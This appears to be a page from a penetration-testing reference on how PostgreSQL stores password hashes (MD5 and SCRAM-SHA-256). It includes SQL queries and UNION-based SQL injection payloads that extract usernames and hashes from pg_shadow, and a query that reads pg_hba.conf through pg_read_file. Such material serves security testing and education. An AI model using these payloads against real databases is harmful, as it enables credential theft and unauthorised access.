---
title: Password Hashing
description: Understanding PostgreSQL password storage and hashing
category: Authentication
order: 19
tags: ["password", "hashing", "authentication"]
lastUpdated: 2025-12-07
---

## Password Hashing

Understanding how PostgreSQL stores passwords is crucial for exploiting extracted credentials. PostgreSQL has evolved its password hashing mechanisms over time.

### Password Storage Location

PostgreSQL stores password hashes in the `pg_authid` system catalog (rolpassword column). The `pg_shadow` view is a backwards-compatibility layer that exposes this data for legacy clients. Prior to PostgreSQL 8.1, `pg_shadow` was a physical table; in 8.1 and later, it's a view over `pg_authid`. Both require superuser privileges to access.

```sql
-- Primary catalog (PostgreSQL 8.1+, requires superuser)
SELECT rolname, rolpassword FROM pg_authid WHERE rolcanlogin;

-- Legacy compatibility view (requires superuser)
SELECT usename, passwd FROM pg_shadow;
```

### Hash Formats

PostgreSQL supports multiple password hash formats:

| Format        | PostgreSQL Version   | Description                        |
| ------------- | -------------------- | ---------------------------------- |
| MD5           | All versions         | `md5` + MD5(password + username)   |
| SCRAM-SHA-256 | 10+ (default in 14+) | SCRAM authentication               |
| Plain text    | Deprecated           | Cleartext (very old installations) |

### MD5 Hash Format

The traditional PostgreSQL MD5 hash:

```text
md5<32 hex characters>
```

The hash is calculated as:

```text
'md5' || MD5(password || username)
```

Example:

```sql
-- For user 'postgres' with password 'secret':
SELECT 'md5' || md5('secretpostgres');
-- Result: md5d578ec61fc8a2bdbe7df2c3096b34e02
```

### SCRAM-SHA-256 Format

Modern PostgreSQL uses SCRAM-SHA-256:

```text
SCRAM-SHA-256$<iterations>:<salt>$<StoredKey>:<ServerKey>
```

Example:

```text
SCRAM-SHA-256$4096:salt$StoredKey:ServerKey
```

### Extracting Password Hashes

```sql
-- Get all password hashes (requires superuser)
SELECT usename, passwd FROM pg_shadow;

-- Get specific user hash
SELECT passwd FROM pg_shadow WHERE usename = 'admin';

-- Get users with MD5 passwords
SELECT usename, passwd FROM pg_shadow WHERE passwd LIKE 'md5%';

-- Get users with SCRAM passwords
SELECT usename, passwd FROM pg_shadow WHERE passwd LIKE 'SCRAM%';
```

### Injection Examples

```sql
-- Extract all credentials
' UNION SELECT NULL,usename||':'||passwd,NULL FROM pg_shadow--

-- Target specific user
' UNION SELECT NULL,passwd,NULL FROM pg_shadow WHERE usename='postgres'--

-- Check hash type
' UNION SELECT NULL,CASE WHEN passwd LIKE 'md5%' THEN 'MD5' WHEN passwd LIKE 'SCRAM%' THEN 'SCRAM' ELSE 'UNKNOWN' END,NULL FROM pg_shadow WHERE usename='postgres'--
```

### Checking Password Encryption Setting

```sql
-- Check current setting
SHOW password_encryption;

-- Or using current_setting
SELECT current_setting('password_encryption');
```

Possible values:

- `md5` - Use MD5 hashing
- `scram-sha-256` - Use SCRAM-SHA-256 (default in PostgreSQL 14+)

### Creating Test Hashes

For verification purposes:

```sql
-- Generate MD5 hash for testing
SELECT 'md5' || md5('password' || 'username');

-- This matches how PostgreSQL stores MD5 passwords
```

### Verifying Extracted Hashes

To verify an MD5 hash is valid:

```python
# Python verification
import hashlib
password = 'secret'
username = 'postgres'
expected_hash = 'md5' + hashlib.md5((password + username).encode()).hexdigest()
print(expected_hash)
```

### Authentication Methods

Check `pg_hba.conf` for authentication methods:

```sql
-- Get hba_file location
SELECT current_setting('hba_file');

-- Read the file (requires superuser)
SELECT pg_read_file(current_setting('hba_file'));
```

### Notes

- `pg_shadow` is only accessible to superusers
- MD5 hashes include the username, making rainbow tables less effective
- SCRAM-SHA-256 is significantly more secure than MD5
- Password hashes alone may not be useful if the server requires specific authentication methods
- Some installations may use external authentication (LDAP, Kerberos, etc.)

See [Password Cracking](/postgresql/password-cracking) for techniques to recover plaintext passwords from hashes.
